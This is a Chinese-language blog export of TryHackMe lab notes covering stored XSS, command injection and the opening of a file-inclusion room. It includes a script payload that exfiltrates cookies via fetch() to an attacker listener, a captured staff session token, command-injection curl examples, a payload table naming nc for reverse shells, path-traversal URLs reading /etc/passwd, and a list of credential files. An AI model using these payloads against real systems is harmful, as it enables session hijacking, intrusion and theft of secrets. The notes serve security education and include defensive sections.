<p>你可以使用 <a class="link"   href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 等网站对编码信息进行 base64 解码。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126091444778.png"
                      alt="image-20221126091444778"
                ></p>
<p>启动目标机器，访问目标站点： <a class="link"   href="https://10-10-138-209.p.thmlabs.com/" >https://10-10-138-209.p.thmlabs.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>单击目标站点顶部导航栏上的“客户”选项卡，然后单击“在此处注册”链接以创建一个新帐户；一旦你的帐户设置完毕，请单击“Support Tickets”选项卡，这是我们将要检测的可能存在XSS漏洞的功能点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126144914883.png"
                      alt="image-20221126144914883"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126144951632.png"
                      alt="image-20221126144951632"
                ></p>
<p>尝试通过单击绿色的“创建ticket”按钮来创建Support ticket，输入主题和内容，你可以仅输入“test”一词，然后单击蓝色的“创建ticket”按钮，然后你就会在列表中注意到你有一个带有 ID 号的新ticket，你可以单击它以查看该ticket的具体信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126145053502.png"
                      alt="image-20221126145053502"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126145128837.png"
                      alt="image-20221126145128837"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126145148959.png"
                      alt="image-20221126145148959"
                ></p>
<p>与研究第三小节的反射型XSS一样，我们会在此处研究先前输入的文本将如何反映在页面源码中。查看页面源代码后，我们可以看到先前我们输入的文本会被放置在 <code>textarea</code> 标签内。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126145330849.png"
                      alt="image-20221126145330849"
                ></p>
<p>现在让我们返回并创建另一张工单，让我们看看是否可以通过在 ticket 的内容中输入以下有效载荷来闭合<code>textarea</code>标签： <code>&lt;/textarea&gt;test</code></p>
<p>同样，此时再打开ticket信息并查看页面源代码，可以看到我们已经成功闭合了 <code>textarea</code> 标签。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126145440317.png"
                      alt="image-20221126145440317"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126145533330.png"
                      alt="image-20221126145533330"
                ></p>
<p>在攻击机(建议使用TryHackMe所提供的AttackBox)上设置一个Netcat监听服务器：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -nlvp 9001</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126152432254.png"
                      alt="image-20221126152432254"
                ></p>
<p>扩展payload（修改ip为攻击机对应ip）：</p>
<p><code>&lt;/textarea&gt;&lt;script&gt;fetch(&#39;http://10.10.165.49:9001?cookie=&#39; + btoa(document.cookie));&lt;/script&gt;</code></p>
<p>使用上面的有效载荷在目标站点上创建一个ticket，然后等待一分钟，你将看到包含受害者(网站工作人员)cookie信息的http请求。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126152730915.png"
                      alt="image-20221126152730915"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126152850608.png"
                      alt="image-20221126152850608"
                ></p>
<blockquote>
<p>自动获取到的cookie值为：c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ&#x3D;&#x3D;</p>
</blockquote>
<p>使用 <a class="link"   href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 网站对编码信息进行 base64 解码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126152939584.png"
                      alt="image-20221126152939584"
                ></p>
<blockquote>
<p>staff-session&#x3D;4AB305E55955197693F01D6F8FD2D321</p>
</blockquote>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Command Injection(命令注入漏洞)-学习</title>
    <url>/2024/01/27/THM-Command%20Injection(%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/oscommandinjection" >https://tryhackme.com/room/oscommandinjection <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解允许你通过易受攻击的应用程序执行命令的漏洞及其补救措施。</p>
<h2 id="什么是命令注入"><a href="#什么是命令注入" class="headerlink" title="什么是命令注入?"></a>什么是命令注入?</h2><p>在本文中，我们将讨论一类Web漏洞–命令注入漏洞，我们需要了解这个漏洞是什么，并会展示它的影响以及它给web应用程序带来的一些风险。</p>
<p>然后，你还能够将这些知识付诸实践，即：</p>
<ul>
<li>如何发现命令注入漏洞</li>
<li>如何为不同操作系统构建payload进行测试以及利用命令注入漏洞</li>
<li>如何在web应用程序中防护命令注入攻击</li>
<li>最后，将相关理论应用于练习中。</li>
</ul>
<p>首先，让我们先了解什么是命令注入。 命令注入是滥用web应用程序的行为从而实现在操作系统上执行命令，在执行系统命令时将获得与OS设备上的web应用程序运行时相同的权限。 例如，在以名为 joe 的用户身份运行的 Web 服务器上实现命令注入将在对应的操作系统用户 joe 权限下执行命令——从而获得用户 joe 所拥有的任何系统权限。</p>
<p>命令注入漏洞也可被称为“远程代码执行”(RCE)，因为攻击者通过命令注入漏洞 可以尝试诱使web应用程序执行他们所提供的一系列有效载荷（在web应用程序中远程执行代码），而无需直接访问目标机器本身（例如：通过交互式 shell的方式）。Web 服务器将在运行该web应用程序的用户的权限下以及相关访问控制级别下  处理并执行 攻击者所提供的payload代码。</p>
<p>RCE意味着攻击者可以直接与易受攻击的目标操作系统进行交互，因此攻击者可能会尝试读取目标系统或用户的文件、数据以及类似的东西。例如，滥用web应用程序以执行命令 <code>whoami</code> 以列出应用程序正在运行的用户帐户信息就是利用命令注入漏洞的一个例子。</p>
<p>命令注入是 2019 年 Contrast Security 的 AppSec 情报报告中的十大漏洞之一（ <a class="link"   href="https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report" >Contrast Security AppSec.，2019 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ）；此外，OWASP 框架也在不断将这种性质的漏洞列为 Web 应用程序的十大漏洞之一（ <a class="link"   href="https://owasp.org/www-project-top-ten/" >OWASP 框架 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ）。</p>
<h2 id="发现命令注入漏洞"><a href="#发现命令注入漏洞" class="headerlink" title="发现命令注入漏洞"></a>发现命令注入漏洞</h2><p>此漏洞的存在是因为应用程序经常使用编程语言（如 PHP、Python 和 NodeJS）中的函数来向计算机操作系统传递数据并在操作系统上进行系统调用操作。 例如，从字段中获取输入信息并在系统文件中搜索相关条目。 以下面的代码片段为例：</p>
<p>在此代码片段中，web应用程序会获取用户在名为 <code>$title</code> 的输入字段中所输入的数据，然后在操作系统上的文件目录中搜索对应的歌曲名称，我们可以将其分解为几个简单的步骤。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126170333914.png"
                      alt="image-20221126170333914"
                ></p>
<ol>
<li>该web应用程序将 MP3 文件存储在指定的操作系统目录下。</li>
<li>用户输入他们想要搜索的歌曲名称，web应用程序将此输入存储到 <code>$title</code> 变量中。</li>
<li>此 <code>$title</code> 变量中的数据被传递给命令 <code>grep</code> –从名为<em>songtitle.txt</em>的文本文件中搜索以找到用户希望搜索的歌曲条目。</li>
<li>从<em>songtitle.txt</em> 文件中搜索得到的最终查找结果将决定该web应用程序通知用户目标歌曲存在与否。</li>
</ol>
<p>在现实环境下，以上文件通常会存储在数据库中；所以上图代码片段只是应用程序从用户处获取输入信息 并 以此与应用程序所对应的操作系统发生交互的一个示例。</p>
<p>攻击者可以通过注入他们自己选择的命令并让应用程序执行该命令 来滥用此web应用程序，攻击者可以要求web应用程序从一些敏感的文件中读取数据，而不是简单地使用<code>grep</code>来搜索 songtitle.txt 中的条目。</p>
<p>无论web应用程序使用何种编程语言，都可能以这种方式滥用应用程序，只要web应用程序处理并执行攻击者所构造的payload，就会导致命令注入。 例如，下面的代码片段是一个用 Python 编写的应用程序。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126180641012.png"
                      alt="image-20221126180641012"
                ></p>
<p>请注意，你不需要了解这些应用程序背后的语法，此处适当概述了这个 Python 应用程序的工作步骤。</p>
<ol>
<li>“<em><strong>flask</strong></em>”包用于设置网络服务器</li>
<li>定义函数，该函数使用“<em><strong>subprocess</strong></em>”包在设备上执行命令</li>
<li>在web服务器中使用一个路由来执行所提供的任何内容。 例如，如果要执行<code>whoami</code>命令，我们需要访问<code>http://flaskapp.thm/whoami</code></li>
</ol>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126181711140.png"
                      alt="image-20221126181711140"
                ></p>
<h2 id="利用命令注入漏洞"><a href="#利用命令注入漏洞" class="headerlink" title="利用命令注入漏洞"></a>利用命令注入漏洞</h2><p>你通常可以通过应用程序的行为来确定是否能够发生命令注入攻击。</p>
<p>使用用户输入的数据来填充系统命令的应用程序，通常可以和意想不到的应用程序行为进行结合。例如，shell 运算符 <code>;</code>、 <code>&amp;</code> 和 <code>&amp;&amp;</code> 将组合两个（或多个）系统命令并同时执行它们。</p>
<p>命令注入主要可以通过以下两种方式进行检测：</p>
<ol>
<li>盲注类型的命令注入（无回显）</li>
<li>详细的命令注入（有回显）</li>
</ol>
<p>下面中定义了这两种方法，第四、五小节将更详细地解释这些方法。</p>
<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">Blind（盲注类型）   这种类型的命令注入 在你测试 payload 时应用程序并没有直接输出结果;因此你将必须调查应用程序的行为以确定你的 payload 是否成功执行。</span><br><span class="line"></span><br><span class="line">Verbose（详细类型） 这种类型的命令注入，在你测试 payload 时能够从应用程序获得直接反馈；</span><br><span class="line">                  例如，当你运行 whoami 命令以查看应用程序在哪个用户下运行时，Web 应用程序将直接在页面上输出具体的用户名信息。</span><br></pre></td></tr></table></figure></div>

<p><strong>检测盲注类型的命令注入（无回显）</strong></p>
<p>盲注类型的命令注入在发生命令注入攻击时，并没有可见的输出显示，因此不会立即引起注意。 例如，当你执行了一条命令，但 Web 应用程序并没有输出任何消息。</p>
<p>对于这种类型的命令注入，我们需要使用会导致一些时间延迟的payload；例如，ping 和 sleep 命令。以 ping命令 为例，根据你指定的 ping 次数，应用程序将挂起 x 秒。</p>
<p>另一种检测盲注类型-命令注入的方法是强制输出一些结果，这可以通过使用诸如 <code>&gt;</code> 之类的重定向运算符来完成，如果你对此不熟悉，建议查看 Linux 基础模块知识点。 例如，我们可以告诉 Web 应用程序执行诸如 <code>whoami</code> 之类的命令并将其重定向到一个新建文件中；然后我们可以使用诸如 <code>cat</code> 之类的命令来读取这个新创建的文件的内容。</p>
<p>测试命令注入通常很复杂，可能需要经过多次尝试，尤其是 Linux 和 Windows 两种操作系统所使用的命令语法还存在不同之处。</p>
<p>使用<code>curl</code>命令也是测试命令注入的好方法，这是因为你可以使用<code>curl</code> 命令在payload中向应用程序传递数据。 以下面的代码片段为例，通过一个简单的 curl payload 传递数据到web应用程序就可以进行命令注入攻击。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">curl http://vulnerable.app/process.php?search=The Beatles; <span class="built_in">whoami</span></span></span><br></pre></td></tr></table></figure></div>

<p><strong>检测详细类型的命令注入（有回显）</strong></p>
<p>检测此种类型的命令注入通常可以用很简单的方法，详细类型的命令注入是指应用程序会向我们提供有关正在发生或正在执行的payload的反馈或输出。</p>
<p>例如，包含<code>ping</code> 或 <code>whoami</code> 等命令的payload的执行结果会直接显示在 Web 应用程序的页面上。</p>
<p><strong>有用的payload</strong></p>
<p> 以下是Linux 和 Windows两种操作系统中的一些有价值的有效载荷（payload）。</p>
<p><em><strong>Linux</strong></em></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami          查看应用程序在哪个用户下运行。</span><br><span class="line"></span><br><span class="line">ls              列出当前目录下的内容，你可能会找到配置文件、环境文件（令牌和应用程序密钥）等文件。</span><br><span class="line"></span><br><span class="line">ping            此命令将调用web应用程序并挂起，这将有助于测试web应用程序是否存在盲注类型的命令注入漏洞。</span><br><span class="line"></span><br><span class="line">sleep           这是测试web应用程序是否存在盲注类型的命令注入漏洞的另一个有用的payload。</span><br><span class="line"></span><br><span class="line">nc              Netcat可用于在易受攻击的web应用程序上生成反向shell，你可以使用此立足点围绕目标机进行导航以获取其他服务、文件或潜在的提权方法。</span><br></pre></td></tr></table></figure></div>

<p><em><strong>Windows</strong></em></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami          查看应用程序在哪个用户下运行。</span><br><span class="line"></span><br><span class="line">dir	            列出当前目录下的内容，你可能会找到配置文件、环境文件（令牌和应用程序密钥）等文件。</span><br><span class="line"></span><br><span class="line">ping            此命令将调用web应用程序并挂起，这将有助于测试web应用程序是否存在盲注类型的命令注入漏洞。</span><br><span class="line"></span><br><span class="line">timeout         此命令也能调用web应用程序并挂起，如果未安装 ping 命令，它对于测试 web应用程序 是否存在盲注类型的命令注入漏洞也很有用。</span><br></pre></td></tr></table></figure></div>

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126224528451.png"
                      alt="image-20221126224528451"
                ></p>
<h2 id="防护命令注入攻击"><a href="#防护命令注入攻击" class="headerlink" title="防护命令注入攻击"></a>防护命令注入攻击</h2><p>可以通过多种方式防止命令注入，从尽可能少地使用编程语言中具有潜在危险的函数或库，到不依赖用户输入并过滤用户输入；下面的示例是在 PHP 编程语言环境下，但是，相同的原则也可以扩展到其他编程语言环境。</p>
<p><strong>减少使用易受攻击的函数</strong></p>
<p>在 PHP 中，有许多函数可以与操作系统发生交互，并通过 shell 执行命令，包括：</p>
<ul>
<li>Exec–执行一个外部程序</li>
<li>Passthru–执行外部程序并且显示原始输出</li>
<li>System–执行外部程序并且显示输出</li>
</ul>
<p>以下面的代码片段为例，在此处，web应用程序将只接受和处理输入到表单中的数字，这意味着不会处理任何输入的命令，例如 whoami。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126231134868.png"
                      alt="image-20221126231134868"
                ></p>
<ol>
<li>该web应用程序将只接受特定的字符格式（数字 0-9）</li>
<li>然后该web应用程序将继续执行这个全是数字的数据。</li>
</ol>
<p>在默认情况下，类似的函数会接受字符串内容或者用户的数据输入，并将执行 在目标系统上被提供的任何内容，因此任何未经适当检查而使用这些函数的web应用程序都容易受到命令注入攻击的影响。</p>
<p><strong>对输入数据进行净化（sanitisation）</strong></p>
<p>清理web应用程序所使用的用户输入是防止命令注入的好方法。 这是指定用户可以提交的数据格式或类型的过程。 例如，可以指定仅接受数字数据或删除任何特殊字符（如 &gt;、&amp; 和 &#x2F;）的输入字段。</p>
<p>在下面的代码片段中，PHP 函数<a class="link"   href="https://www.php.net/manual/en/function.filter-input.php" >filter_input <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>用于检查通过输入表单提交的任何数据是否为数字，如果不是数字，则视为无效输入。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126233729080.png"
                      alt="image-20221126233729080"
                ></p>
<p><strong>绕过过滤器</strong></p>
<p>web应用程序可以采用多种技术来过滤和清理从用户输入中获取的数据，这些过滤器将限制你使用特定的有效载荷； 但是，我们可以滥用web应用程序背后的逻辑来绕过这些过滤器。 </p>
<p>例如，web应用程序可能会去掉我们所使用的payload中的引号，我们此时可以尝试改用引号的十六进制值来替代payload中的引号；虽然最终使用的payload数据格式与预期的不同，但仍然可以得到该payload成功执行的对应结果。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126235110547.png"
                      alt="image-20221126235110547"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221126235707461.png"
                      alt="image-20221126235707461"
                ></p>
<h2 id="命令注入漏洞-练习"><a href="#命令注入漏洞-练习" class="headerlink" title="命令注入漏洞-练习"></a>命令注入漏洞-练习</h2><p>启动目标机器，在分屏中可见的网站上所托管的web应用程序上测试一些有效载荷，以测试命令注入漏洞。 如果你遇到困难或者希望探索一些更复杂的有效载荷，请参阅此备忘单： <a class="link"   href="https://github.com/payloadbox/command-injection-payload-list" >https://github.com/payloadbox/command-injection-payload-list <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在<code>/home/tryhackme/flag.txt</code>中找到flag的内容，你可以使用有效载荷来实现这一点——建议尝试多种有效载荷。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127201043929.png"
                      alt="image-20221127201043929"
                ></p>
<p>启动目标机器，并查看分屏中的web应用程序：</p>
<p>通过在下面的字段中输入设备的 IP 地址，使用这个简易的 Web 应用程序来测试目标设备的可用性。 例如，127.0.0.1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127203232018.png"
                      alt="image-20221127203232018"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127203514803.png"
                      alt="image-20221127203514803"
                ></p>
<blockquote>
<p>www-data</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127204825987.png"
                      alt="image-20221127204825987"
                ></p>
<blockquote>
<p>THM{COMMAND_INJECTION_COMPLETE}</p>
</blockquote>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-File Inclusion(文件包含漏洞)-学习</title>
    <url>/2024/01/27/THM-File%20Inclusion(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/fileinc" >https://tryhackme.com/room/fileinc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：了解文件包含漏洞，包括本地文件包含（LFI）、远程文件包含（RFI）和路径遍历（目录遍历）。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>什么是文件包含？</strong></p>
<p>本文旨在为你提供利用文件包含漏洞的基本知识，包括本地文件包含 (LFI)、远程文件包含 (RFI) 和路径遍历（目录遍历）；此外，我们还将讨论此类漏洞被发现后的风险以及所需要采取的补救措施。 我们还会讲解关于文件包含漏洞的一些实际示例以及实践挑战。</p>
<p>在某些情况下，Web 应用程序被编写为 可以通过参数请求访问给定系统上的文件，包括图像、静态文本等。 参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行操作。 下图解释并分解了关于 URL的主要组成部分。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221115220829523.png"
                      alt="image-20221115220829523"
                ></p>
<p>例如，参数可以和 Google 搜索一起使用，使用<code>GET</code> 请求能将用户输入传递到搜索引擎：<code>https://www.google.com/search?q=TryHackMe</code> 。如果你不熟悉该主题，可以查看 Web 工作原理模块以了解相关概念。</p>
<p>让我们讨论当用户发出请求从web服务器处访问具体文件的场景。 首先，用户将向包含目标文件的 Web 服务器发送 HTTP 请求，例如，如果用户想要在 Web 应用程序中访问和显示他们的 CV（Curriculum Vitae-个人简历），发出的URL请求可能如下所示：<code>http://webapp.thm/get.php?file=userCV.pdf</code>，其中<code>file</code>为参数， <code>userCV.pdf</code> 是所需访问的具体文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221115230809106.png"
                      alt="image-20221115230809106"
                ></p>
<p><strong>为什么会存在文件包含漏洞？</strong></p>
<p>文件包含漏洞通常会在各种 Web 应用程序编程语言中被发现以及利用，例如编写和实现不佳的 PHP代码。 这些漏洞的主要问题是由 输入验证机制 所导致的，具体表现为 来自用户的输入没有经过过滤或安全验证，且用户能够控制他们所输入的字符；当用户的输入未被安全验证时，用户就可以将任何输入传递给代码中的函数，从而导致文件包含漏洞。</p>
<p><strong>文件包含漏洞的风险是什么？</strong></p>
<p>这取决于攻击者能否利用文件包含漏洞读取到敏感数据，成功的文件包含漏洞攻击会导致敏感数据泄露，这些敏感数据包括与 Web 应用程序相关的代码、文件、后端系统的凭据等；此外，如果攻击者可以通过某种方式写入内容到服务器，例如 &#x2F;tmp 目录，那么还有可能导致远程命令执行（RCE）漏洞。</p>
<p>但是，如果在目标网站上发现某个文件包含漏洞存在却无法访问到敏感数据也无法写入内容到服务器，则意味着该文件包含漏洞其实是无效的。</p>
<h2 id="部署目标虚拟机"><a href="#部署目标虚拟机" class="headerlink" title="部署目标虚拟机"></a>部署目标虚拟机</h2><p>部署目标机器，然后访问链接 <a class="link"   href="http://machine_ip/" >http://MACHINE_IP/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，成功访问目标网站时的主页面将如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221115232441946.png"
                      alt="image-20221115232441946"
                ></p>
<h2 id="路径遍历（目录遍历）"><a href="#路径遍历（目录遍历）" class="headerlink" title="路径遍历（目录遍历）"></a>路径遍历（目录遍历）</h2><p><strong>路径遍历</strong></p>
<p>路径遍历也被称为目录遍历，是一个允许攻击者读取操作系统资源的web安全漏洞，例如在（运行应用程序的）服务器上的本地文件。 攻击者通过操纵和滥用 Web 应用程序的 URL 来定位和访问存储在应用程序根目录之外的文件或目录，从而实现对此类漏洞的利用。</p>
<p>当用户的输入被传递给 PHP 中的 <em><strong>file_get_contents</strong></em> 等函数时，就可能会出现路径遍历漏洞；但是要注意，该函数并不是导致该漏洞的主要因素，通常情况下<em><strong>输入验证不佳</strong></em> 或者<em><strong>过滤不当</strong></em>才是造成路径遍历漏洞的原因。 </p>
<p>在 PHP 中，你可以使用 <em><strong>file_get_contents</strong></em> 来读取文件的内容，有关该函数的更多信息：<a class="link"   href="https://www.php.net/manual/en/function.file-get-contents.php" >https://www.php.net/manual/en/function.file-get-contents.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下图显示了 Web 应用程序如何将文件存储在***&#x2F;var&#x2F;www&#x2F;app*** 中，用户能够通过路径 <em><strong>&#x2F;var&#x2F;www&#x2F;app&#x2F;CVs&#x2F;userCV.pdf</strong></em> 请求 <em><strong>userCV.pdf</strong></em> 的内容。</p>
<p>路径遍历攻击，也被称为点-点-斜线攻击，利用***..&#x2F;*** 能将目录向上移动一级；我们可以通过添加payload来测试 URL 参数，以查看 Web 应用程序的行为方式。</p>
<p>如果攻击者找到 URL 入口点，在本例中为 <em><strong>get.php?file&#x3D;</strong></em> ，对应的当前目录为***&#x2F;var&#x2F;www&#x2F;app&#x2F;CVs&#x2F;<em><strong>，那么攻击者可以发送如下内容访问密码文件：</strong></em><a class="link"   href="http://webapp.thm/get.php?file=../../../../etc/passwd" >http://webapp.thm/get.php?file=../../../../etc/passwd <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>***</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221116190916400.png"
                      alt="image-20221116190916400"
                ></p>
<p>如果没有输入验证，也不是访问位于<code>/var/www/app/CVs</code>位置的 PDF 文件，而是通过Web 应用程序从其他目录检索文件，在本例中被检索的为<code>/etc/passwd</code>文件，这个过程就是对路径遍历漏洞的利用。payload中的每个<code>..</code>都代表移动到上一级目录，直到到达根目录 <code>/</code>，然后再将目录更改为<code>/etc</code>，并从那里读取<code>passwd</code>文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221116195059229.png"
                      alt="image-20221116195059229"
                ></p>
<p>最终，Web 应用程序会将对应路径的文件内容发回给攻击者用户：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221116200239013.png"
                      alt="image-20221116200239013"
                ></p>
<p>同样，如果 Web 应用程序在 Windows 服务器上运行，则攻击者需要提供 Windows 路径。 例如，如果攻击者想要读取位于 <code>c:\boot.ini</code> 中的 <em><strong>boot.ini</strong></em> 文件，那么攻击者可以根据目标操作系统版本尝试以下payload：</p>
<blockquote>
<p><a class="link"   href="http://webapp.thm/get.php?file=../../../../boot.ini" >http://webapp.thm/get.php?file=../../../../boot.ini <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>#或者</p>
<p><a class="link"   href="http://webapp.thm/get.php?file=../../../../windows/win.ini" >http://webapp.thm/get.php?file=../../../../windows/win.ini <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>在Windows系统中，我们也是向上移动目录直到到达根目录，通常是 <code>c:\</code>；有时，开发人员会添加过滤器以限制对某些文件或目录的访问，以下是在渗透测试时可能需要经常使用的一些操作系统文件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Location                                                     Description</span><br><span class="line"></span><br><span class="line">/etc/issue                                              包含要在登录提示之前打印的消息或系统标识。</span><br><span class="line"></span><br><span class="line">/etc/profile                     控制系统范围的默认变量，例如导出（Export）变量、文件创建掩码 (umask)、终端类型、用于指示新邮件何时到达的邮件消息</span><br><span class="line"></span><br><span class="line">/proc/version                                           指定 Linux 内核的版本</span><br><span class="line"></span><br><span class="line">/etc/passwd                                             包含有权访问系统的所有注册用户信息</span><br><span class="line"></span><br><span class="line">/etc/shadow                                             包含系统用户密码的信息</span><br><span class="line"></span><br><span class="line">/root/.bash_history                                     包含 root 用户的历史命令</span><br><span class="line"></span><br><span class="line">/var/log/dmessage                                   包含全局系统消息，包括系统启动期间记录的消息</span><br><span class="line"></span><br><span class="line">/var/mail/root                                          root 用户的所有电子邮件</span><br><span class="line"></span><br><span class="line">/root/.ssh/id_rsa                               服务器上的root 用户或任何已知有效用户的 SSH 私钥</span><br><span class="line"></span><br><span class="line">/var/log/apache2/access.log                             Apache web服务器的访问请求        </span><br><span class="line"></span><br><span class="line">C:\boot.ini                                             包含具有 BIOS 固件的计算机的引导选项</span><br></pre></td></tr></table></figure></div>

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221115232822325.png"
                      alt="image-20221115232822325"
                ></p>
<blockquote>
<p>file_get_contents</p>
</blockquote>
<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含 (﻿LFI)"></a>本地文件包含 (﻿LFI)</h2><p><strong>Local File Inclusion (﻿LFI-本地文件包含)</strong></p>
<p>针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识而导致的。 对于 PHP，使用 <code>include</code>、<code>require</code>、<code>include_once</code> 和 <code>require_once</code> 等函数通常会导致Web 应用程序易受攻击。 在本文中，我们选择分析的语言是 PHP，但值得注意的是，在使用其他语言（例如 ASP、JSP，甚至 Node.js 应用程序）时也会出现 LFI（本地文件包含） 漏洞。 LFI 漏洞利用 将遵循与路径遍历漏洞相同的概念。</p>
<p>在本节中，我们将带你了解各种 LFI 场景以及如何利用它们。</p>
<p><em><strong>1.假设web应用提供了两种国家的语言，用户可以在EN和AR之间进行选择</strong></em></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;lang&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>上面的 PHP 代码通过 URL 参数 <code>lang</code> 并使用 GET 请求来包含页面文件。 </p>
<p>你可以通过输入以下 HTTP 请求来完成文件调用：输入<code>http://webapp.thm/index.php?lang=EN.php</code> 加载英文页面或 <code>http://webapp.thm/index.php?lang=AR.php</code> 加载阿拉伯文页面，<em><strong>EN.php</strong></em> 和 <em><strong>AR.php</strong></em> 文件都在同一目录下。</p>
